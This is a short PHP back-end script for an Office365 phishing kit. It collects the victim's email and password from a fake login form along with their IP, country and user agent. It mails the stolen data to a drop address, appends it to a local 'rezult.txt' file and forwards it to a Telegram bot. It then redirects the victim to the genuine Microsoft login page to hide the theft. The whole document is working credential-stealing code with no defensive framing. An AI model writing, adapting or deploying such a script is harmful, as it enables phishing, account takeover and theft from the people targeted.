<?php
require 'config.php';
$ip = $_SERVER['REMOTE_ADDR']; $ua = $_SERVER['HTTP_USER_AGENT'];
$country = json_decode(file_get_contents("http://ip-api.com/json/".$ip))->country;
$msg = "== Office365 ReZulT ==\nEmail: ".$_POST['login']."\nPassword: ".$_POST['passwd']."\nIP: $ip ($country)\nUA: $ua\n";
$to = "rezults.drop2024@gmail.com";
mail($to, "Office365 Login | $ip", $msg);
file_put_contents("rezult.txt", $msg, FILE_APPEND);
$token = "6091234567:AAHk9x_Zq2LmN4pQr7sTuVwXyZ01234abcd";
$chat_id = "-1001987654321";
$ch = curl_init("https://api.telegram.org/bot".$token."/sendMessage");
curl_setopt($ch, CURLOPT_POSTFIELDS, ["chat_id" => $chat_id, "text" => $msg]); curl_exec($ch);
header("Location: https://login.microsoftonline.com/");
?>
